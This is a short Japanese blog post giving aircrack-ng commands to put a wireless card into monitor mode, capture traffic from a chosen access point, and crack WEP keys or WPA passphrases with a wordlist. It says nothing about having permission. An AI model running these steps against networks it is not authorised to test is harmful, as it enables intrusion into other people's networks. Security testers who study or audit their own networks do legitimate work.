---
layout: post
title: "aircrack-ng"
date: 2015-03-28
comments: true
categories: os
tags: [linux, aircrack-ng]
---
<img src="{{ root_url }}/images/more.png" alt="phoenix-power" align="left" width="100" height="100">無線LANのパスワード解析方法<!--more--><br clear="all">

まず、モニターモードで無線LANの情報を拾います。

{% codeblock lang:bash %}
$ iw list

$ iwconfig

$ sudo airmon-ng check kill

$ sudo airmon-ng start wlp2s0b1

$ sudo airodump-ng mon0 
{% endcodeblock %}

次に、`airodump-ng`でパケットを集め、`#Data`が`800,000 IV`くらいになったら、`WEP`の場合、パスワードが解析できます。`WAP`の場合は、辞書ファイルを用意し解析します。

{% codeblock lang:bash %}
#IV
$ sudo airodump-ng -c 1 --bssid $bssid -w cap mon0

#WEP
$ sudo aircrack-ng hoge.cap

# WAP
$ sudo aircrack-ng -w pass.txt hoge.cap
{% endcodeblock %}

http://syui.github.io/middleman/blog/2015/03/27/aircrack-ng.html

